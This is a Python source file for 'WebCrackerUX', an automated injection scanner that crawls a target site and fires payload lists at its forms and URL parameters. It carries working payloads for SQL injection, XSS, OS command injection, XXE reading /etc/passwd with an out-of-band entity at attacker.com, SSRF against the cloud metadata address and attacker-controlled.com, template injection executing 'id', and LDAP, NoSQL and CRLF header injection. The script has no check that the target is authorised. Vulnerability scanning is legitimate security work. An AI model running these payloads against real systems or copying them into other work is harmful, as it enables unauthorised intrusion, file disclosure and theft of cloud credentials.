#!/usr/bin/env python3
"""
Owner: Abdul Mannan aka ShaheenUX
Social Handles: github.com/shaheenUX , instagram.com/shaheen_hacker , linktr.ee/shaheen_hacker
WebCrackerUX v1.O - INJECTION VULNERABILITY CHECKS
Description: 
  Comprehensive injection vulnerability scanner covering 10 attack vectors
  with advanced exploitation techniques and adaptive payloads
"""

import os
import sys
import re
import json
import time
import random
import string
import requests
import urllib.parse
from bs4 import BeautifulSoup
from colorama import Fore, Style
from config import TARGET_DOMAIN, BASE_URL, HTTPS_URL, USER_AGENT, REQUEST_TIMEOUT

# Global configuration
REPORT_FILE = "reports/injection_report.txt"
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": USER_AGENT})

class InjectionScanner:
    def __init__(self):
        self.target = BASE_URL
        self.https_target = HTTPS_URL
        self.results = []
        self.forms = []
        self.endpoints = []
        self.sqli_payloads = self._load_sqli_payloads()
        self.xss_payloads = self._load_xss_payloads()
        self.command_payloads = self._load_command_payloads()
        self.xxe_payloads = self._load_xxe_payloads()
        self.ssrf_payloads = self._load_ssrf_payloads()
        
    def _load_sqli_payloads(self):
        """Load SQL injection test payloads"""
        return [
            "'", 
            "\"", 
            "' OR '1'='1", 
            "\" OR \"1\"=\"1", 
            "' OR 1=1--", 
            "admin'--", 
            "1' ORDER BY 1--", 
            "1' UNION SELECT null,table_name FROM information_schema.tables--",
            "1; WAITFOR DELAY '0:0:5'--",  # Time-based detection
            "1 AND SLEEP(5)"  # MySQL time-based
        ]
    
    def _load_xss_payloads(self):
        """Load XSS test payloads with evasion techniques"""
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",  # AngularJS
            "';alert(1)//", 
            "\";alert(1)//",
            "${alert(1)}",  # Template injection
            "<iframe srcdoc='<script>alert(1)</script>'>"
        ]
    
    def _load_command_payloads(self):
        """Load command injection test payloads"""
        return [
            ";id",
            "|id",
            "&&id",
            "||id",
            "`id`",
            "$(id)",
            "id%00",  # Null byte
            "id\n",   # Newline
            "id\r\n", # Windows newline
            "id%0a"   # URL encoded newline
        ]
    
    def _load_xxe_payloads(self):
        """Load XXE test payloads"""
        return [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe">%remote;%init;]><root/>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
        ]
    
    def _load_ssrf_payloads(self):
        """Load SSRF test payloads"""
        return [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost/admin",
            "http://127.0.0.1:8080",
            "file:///etc/passwd",
            "dict://localhost:6379/info",
            "gopher://localhost:6379/_INFO%0d%0a",
            "http://[::1]/",
            "http://2130706433/",  # Decimal localhost
            "http://0x7f000001/",  # Hex localhost
            "http://attacker-controlled.com/ssrf"
        ]
    
    def _crawl_for_inputs(self):
        """Crawl the target to find forms and API endpoints"""
        print(f"{Fore.CYAN}[*] Crawling target for input points...{Style.RESET_ALL}")
        
        try:
            response = SESSION.get(self.target)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all('input'):
                    form_info['inputs'].append({
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    })
                
                self.forms.append(form_info)
            
            # Find potential API endpoints
            for link in soup.find_all('a', href=True):
                href = link['href']
                if any(x in href for x in ['id=', 'user=', 'product=', 'page=']):
                    self.endpoints.append(href)
            
            print(f"{Fore.GREEN}[+] Found {len(self.forms)} forms and {len(self.endpoints)} endpoints{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Crawling failed: {e}{Style.RESET_ALL}")
    
    def _test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for SQL injection...{Style.RESET_ALL}")
        
        vulnerable = False
        
        # Test URL parameters
        for endpoint in self.endpoints:
            for param in re.findall(r'(\w+)=([^&]*)', endpoint):
                param_name, param_value = param
                for payload in self.sqli_payloads:
                    try:
                        test_url = endpoint.replace(f"{param_name}={param_value}", 
                                                  f"{param_name}={urllib.parse.quote(payload)}")
                        start_time = time.time()
                        response = SESSION.get(test_url, timeout=REQUEST_TIMEOUT)
                        elapsed = time.time() - start_time
                        
                        # Check for time-based SQLi
                        if elapsed > 5 and ('WAITFOR' in payload or 'SLEEP' in payload):
                            vulnerable = True
                            print(f"{Fore.RED}[-] Time-based SQLi in {param_name} at {endpoint}{Style.RESET_ALL}")
                            self.results.append({
                                "vulnerability": "SQL Injection (Time-Based)",
                                "severity": "Critical",
                                "description": f"Parameter {param_name} appears vulnerable to time-based SQL injection",
                                "payload": payload,
                                "location": endpoint
                            })
                            break
                        
                        # Check for boolean-based SQLi
                        if any(error in response.text.lower() for error in ['sql', 'syntax', 'mysql', 'ora-']):
                            vulnerable = True
                            print(f"{Fore.RED}[-] SQLi in {param_name} at {endpoint}{Style.RESET_ALL}")
                            self.results.append({
                                "vulnerability": "SQL Injection (Error-Based)",
                                "severity": "Critical",
                                "description": f"Parameter {param_name} appears vulnerable to error-based SQL injection",
                                "payload": payload,
                                "location": endpoint
                            })
                            break
                    except Exception:
                        continue
        
        # Test form inputs
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['type'] in ['hidden', 'submit']:
                    continue
                    
                for payload in self.sqli_payloads:
                    try:
                        data = {}
                        for field in form['inputs']:
                            data[field['name']] = field['value'] if field['name'] != input_field['name'] else payload
                        
                        if form['method'] == 'GET':
                            response = SESSION.get(form['action'], params=data)
                        else:
                            response = SESSION.post(form['action'], data=data)
                        
                        if any(error in response.text.lower() for error in ['sql', 'syntax', 'mysql', 'ora-']):
                            vulnerable = True
                            print(f"{Fore.RED}[-] SQLi in form field {input_field['name']}{Style.RESET_ALL}")
                            self.results.append({
                                "vulnerability": "SQL Injection (Form)",
                                "severity": "Critical",
                                "description": f"Form field {input_field['name']} appears vulnerable to SQL injection",
                                "payload": payload,
                                "location": form['action']
                            })
                            break
                    except Exception:
                        continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No SQL injection vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_xss(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for XSS vulnerabilities...{Style.RESET_ALL}")
        
        vulnerable = False
        
        # Test URL parameters
        for endpoint in self.endpoints:
            for param in re.findall(r'(\w+)=([^&]*)', endpoint):
                param_name, param_value = param
                for payload in self.xss_payloads:
                    try:
                        test_url = endpoint.replace(f"{param_name}={param_value}", 
                                                  f"{param_name}={urllib.parse.quote(payload)}")
                        response = SESSION.get(test_url)
                        
                        # Check if payload appears unencoded in response
                        if payload.lower() in response.text.lower():
                            vulnerable = True
                            print(f"{Fore.RED}[-] XSS in {param_name} at {endpoint}{Style.RESET_ALL}")
                            self.results.append({
                                "vulnerability": "Cross-Site Scripting (Reflected)",
                                "severity": "High",
                                "description": f"Parameter {param_name} appears vulnerable to reflected XSS",
                                "payload": payload,
                                "location": endpoint
                            })
                            break
                    except Exception:
                        continue
        
        # Test form inputs
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['type'] in ['hidden', 'submit']:
                    continue
                    
                for payload in self.xss_payloads:
                    try:
                        data = {}
                        for field in form['inputs']:
                            data[field['name']] = field['value'] if field['name'] != input_field['name'] else payload
                        
                        if form['method'] == 'GET':
                            response = SESSION.get(form['action'], params=data)
                        else:
                            response = SESSION.post(form['action'], data=data)
                        
                        if payload.lower() in response.text.lower():
                            vulnerable = True
                            print(f"{Fore.RED}[-] XSS in form field {input_field['name']}{Style.RESET_ALL}")
                            self.results.append({
                                "vulnerability": "Cross-Site Scripting (Stored)",
                                "severity": "High",
                                "description": f"Form field {input_field['name']} appears vulnerable to stored XSS",
                                "payload": payload,
                                "location": form['action']
                            })
                            break
                    except Exception:
                        continue
        
        # Test for DOM XSS in JavaScript
        try:
            response = SESSION.get(self.target)
            if any("document.write" in script.text and "location.hash" in script.text 
                  for script in BeautifulSoup(response.text, 'html.parser').find_all('script')):
                vulnerable = True
                print(f"{Fore.RED}[-] Potential DOM-based XSS detected{Style.RESET_ALL}")
                self.results.append({
                    "vulnerability": "DOM-based XSS",
                    "severity": "High",
                    "description": "Potential DOM-based XSS via location.hash/document.write",
                    "payload": "N/A",
                    "location": "Client-side JavaScript"
                })
        except Exception:
            pass
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No XSS vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_command_injection(self):
        """Test for OS command injection vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for command injection...{Style.RESET_ALL}")
        
        vulnerable = False
        
        # Test forms that might execute commands (search, contact, etc.)
        for form in self.forms:
            if not any(keyword in form['action'].lower() for keyword in ['search', 'query', 'contact', 'ping']):
                continue
                
            for input_field in form['inputs']:
                if input_field['type'] in ['hidden', 'submit']:
                    continue
                    
                for payload in self.command_payloads:
                    try:
                        data = {}
                        for field in form['inputs']:
                            data[field['name']] = field['value'] if field['name'] != input_field['name'] else payload
                        
                        response = SESSION.post(form['action'], data=data)
                        
                        # Check for command injection indicators
                        if any(indicator in response.text.lower() 
                               for indicator in ['uid=', 'gid=', 'groups=', 'root:', 'bin/bash']):
                            vulnerable = True
                            print(f"{Fore.RED}[-] Command injection in {input_field['name']}{Style.RESET_ALL}")
                            self.results.append({
                                "vulnerability": "OS Command Injection",
                                "severity": "Critical",
                                "description": f"Form field {input_field['name']} appears vulnerable to command injection",
                                "payload": payload,
                                "location": form['action']
                            })
                            break
                    except Exception:
                        continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No command injection vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_xxe(self):
        """Test for XML External Entity processing vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for XXE vulnerabilities...{Style.RESET_ALL}")
        
        vulnerable = False
        
        # Find potential XML endpoints
        xml_endpoints = []
        try:
            response = SESSION.get(self.target)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                if form.get('enctype', '') == 'text/xml':
                    xml_endpoints.append(form['action'])
            
            for link in soup.find_all('a', href=True):
                if any(ext in link['href'].lower() for ext in ['.xml', '.rss', '.svg']):
                    xml_endpoints.append(link['href'])
        except Exception:
            pass
        
        if not xml_endpoints:
            print(f"{Fore.YELLOW}[!] No obvious XML endpoints found{Style.RESET_ALL}")
            return
        
        # Test each endpoint
        for endpoint in xml_endpoints:
            for payload in self.xxe_payloads:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = SESSION.post(endpoint, data=payload, headers=headers)
                    
                    # Check for XXE indicators
                    if any(indicator in response.text 
                           for indicator in ['root:', 'bin/bash', '/etc/passwd']):
                        vulnerable = True
                        print(f"{Fore.RED}[-] XXE vulnerability detected at {endpoint}{Style.RESET_ALL}")
                        self.results.append({
                            "vulnerability": "XML External Entity (XXE)",
                            "severity": "Critical",
                            "description": f"Endpoint appears vulnerable to XXE injection",
                            "payload": payload,
                            "location": endpoint
                        })
                        break
                except Exception:
                    continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No XXE vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_ssrf(self):
        """Test for Server-Side Request Forgery vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for SSRF vulnerabilities...{Style.RESET_ALL}")
        
        vulnerable = False
        
        # Test URL parameters that might make external requests
        ssrf_params = ['url', 'image', 'load', 'fetch', 'request', 'proxy']
        for endpoint in self.endpoints:
            for param in re.findall(r'(\w+)=([^&]*)', endpoint):
                param_name, param_value = param
                if param_name.lower() not in ssrf_params:
                    continue
                    
                for payload in self.ssrf_payloads:
                    try:
                        test_url = endpoint.replace(f"{param_name}={param_value}", 
                                                  f"{param_name}={urllib.parse.quote(payload)}")
                        response = SESSION.get(test_url)
                        
                        # Check for SSRF indicators
                        if any(indicator in response.text 
                               for indicator in ['169.254.169.254', 'metadata', 'localhost', '127.0.0.1']):
                            vulnerable = True
                            print(f"{Fore.RED}[-] SSRF in {param_name} at {endpoint}{Style.RESET_ALL}")
                            self.results.append({
                                "vulnerability": "Server-Side Request Forgery (SSRF)",
                                "severity": "High",
                                "description": f"Parameter {param_name} appears vulnerable to SSRF",
                                "payload": payload,
                                "location": endpoint
                            })
                            break
                    except Exception:
                        continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No SSRF vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_template_injection(self):
        """Test for Server-Side Template Injection"""
        print(f"{Fore.CYAN}[*] Testing for template injection...{Style.RESET_ALL}")
        
        vulnerable = False
        template_payloads = {
            'generic': ['{{7*7}}', '<%= 7*7 %>', '${7*7}', '#{7*7}'],
            'jinja2': ['{{config.items()}}', '{{self.__dict__}}'],
            'twig': ['{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'],
            'freemarker': ['<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }']
        }
        
        # Test URL parameters
        for endpoint in self.endpoints:
            for param in re.findall(r'(\w+)=([^&]*)', endpoint):
                param_name, param_value = param
                for engine, payloads in template_payloads.items():
                    for payload in payloads:
                        try:
                            test_url = endpoint.replace(f"{param_name}={param_value}", 
                                                      f"{param_name}={urllib.parse.quote(payload)}")
                            response = SESSION.get(test_url)
                            
                            # Check for template evaluation
                            if ('49' in response.text and '7*7' in payload) or 'uid=' in response.text:
                                vulnerable = True
                                print(f"{Fore.RED}[-] Template injection ({engine}) in {param_name} at {endpoint}{Style.RESET_ALL}")
                                self.results.append({
                                    "vulnerability": f"Server-Side Template Injection ({engine})",
                                    "severity": "High",
                                    "description": f"Parameter {param_name} appears vulnerable to {engine} template injection",
                                    "payload": payload,
                                    "location": endpoint
                                })
                                break
                        except Exception:
                            continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No template injection vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_ldap_injection(self):
        """Test for LDAP injection vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for LDAP injection...{Style.RESET_ALL}")
        
        vulnerable = False
        ldap_payloads = [
            '*', 
            '*)(&', 
            '*))%00', 
            ')(cn=))\x00', 
            '*|%26', 
            'admin*', 
            '(|(uid=*))'
        ]
        
        # Test login forms specifically
        for form in self.forms:
            if 'login' not in form['action'].lower():
                continue
                
            for input_field in form['inputs']:
                if input_field['type'] in ['hidden', 'submit']:
                    continue
                    
                for payload in ldap_payloads:
                    try:
                        data = {}
                        for field in form['inputs']:
                            data[field['name']] = field['value'] if field['name'] != input_field['name'] else payload
                        
                        response = SESSION.post(form['action'], data=data)
                        
                        # Check for successful auth or LDAP errors
                        if 'welcome' in response.text.lower() or 'ldap' in response.text.lower():
                            vulnerable = True
                            print(f"{Fore.RED}[-] LDAP injection in {input_field['name']}{Style.RESET_ALL}")
                            self.results.append({
                                "vulnerability": "LDAP Injection",
                                "severity": "High",
                                "description": f"Form field {input_field['name']} appears vulnerable to LDAP injection",
                                "payload": payload,
                                "location": form['action']
                            })
                            break
                    except Exception:
                        continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No LDAP injection vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for NoSQL injection...{Style.RESET_ALL}")
        
        vulnerable = False
        nosql_payloads = [
            '{"$ne": "invalid"}', 
            '{"$gt": ""}', 
            'admin\' || \'1==\'1', 
            '{"$where": "true"}',
            'admin\\" || \\"1==\\"1'
        ]
        
        # Test API-like endpoints
        for endpoint in self.endpoints:
            if 'api' not in endpoint.lower():
                continue
                
            for payload in nosql_payloads:
                try:
                    headers = {'Content-Type': 'application/json'}
                    response = SESSION.post(endpoint, data=payload, headers=headers)
                    
                    # Check for successful auth or MongoDB errors
                    if 'welcome' in response.text.lower() or 'mongodb' in response.text.lower():
                        vulnerable = True
                        print(f"{Fore.RED}[-] NoSQL injection at {endpoint}{Style.RESET_ALL}")
                        self.results.append({
                            "vulnerability": "NoSQL Injection",
                            "severity": "High",
                            "description": f"Endpoint appears vulnerable to NoSQL injection",
                            "payload": payload,
                            "location": endpoint
                        })
                        break
                except Exception:
                    continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No NoSQL injection vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_header_injection(self):
        """Test for HTTP header injection vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for header injection...{Style.RESET_ALL}")
        
        vulnerable = False
        header_payloads = [
            'test\r\nX-Forwarded-Host: attacker.com',
            'test\r\nLocation: http://attacker.com',
            'test\r\nSet-Cookie: malicious=payload'
        ]
        
        # Test forms with redirects
        for form in self.forms:
            if 'login' not in form['action'].lower() and 'contact' not in form['action'].lower():
                continue
                
            for input_field in form['inputs']:
                if input_field['type'] in ['hidden', 'submit']:
                    continue
                    
                for payload in header_payloads:
                    try:
                        data = {}
                        for field in form['inputs']:
                            data[field['name']] = field['value'] if field['name'] != input_field['name'] else payload
                        
                        response = SESSION.post(form['action'], data=data, allow_redirects=False)
                        
                        # Check for injected headers
                        if any(header in response.headers 
                               for header in ['X-Forwarded-Host', 'Location', 'malicious']):
                            vulnerable = True
                            print(f"{Fore.RED}[-] Header injection in {input_field['name']}{Style.RESET_ALL}")
                            self.results.append({
                                "vulnerability": "HTTP Header Injection",
                                "severity": "Medium",
                                "description": f"Form field {input_field['name']} appears vulnerable to header injection",
                                "payload": payload,
                                "location": form['action']
                            })
                            break
                    except Exception:
                        continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No header injection vulnerabilities detected{Style.RESET_ALL}")
    
    def _generate_report(self):
        """Generate vulnerability report"""
        os.makedirs(os.path.dirname(REPORT_FILE), exist_ok=True)
        
        with open(REPORT_FILE, 'w') as f:
            f.write(f"Injection Vulnerability Test Report\n")
            f.write(f"Target: {TARGET_DOMAIN}\n")
            f.write(f"Date: {time.ctime()}\n\n")
            
            if not self.results:
                f.write("No injection vulnerabilities found!\n")
                return
            
            f.write("Vulnerabilities Found:\n")
            f.write("=" * 80 + "\n")
            
            for i, result in enumerate(self.results, 1):
                f.write(f"{i}. {result['vulnerability']} ({result['severity']})\n")
                f.write(f"   Description: {result['description']}\n")
                f.write(f"   Payload: {result['payload']}\n")
                f.write(f"   Location: {result['location']}\n\n")
        
        print(f"{Fore.GREEN}[+] Report saved to {REPORT_FILE}{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] Found {len(self.results)} vulnerabilities!{Style.RESET_ALL}")
    
    def run_all_checks(self):
        """Execute all injection tests"""
        print(f"\n{Fore.BLUE}=== Starting Injection Vulnerability Tests ==={Style.RESET_ALL}")
        
        # First crawl the site for inputs
        self._crawl_for_inputs()
        
        # Run all tests
        tests = [
            self._test_sql_injection,
            self._test_xss,
            self._test_command_injection,
            self._test_xxe,
            self._test_ssrf,
            self._test_template_injection,
            self._test_ldap_injection,
            self._test_nosql_injection,
            self._test_header_injection
        ]
        
        for test in tests:
            try:
                test()
            except Exception as e:
                print(f"{Fore.RED}[-] Test failed: {e}{Style.RESET_ALL}")
        
        # Generate report
        self._generate_report()

if __name__ == "__main__":
    scanner = InjectionScanner()
    scanner.run_all_checks()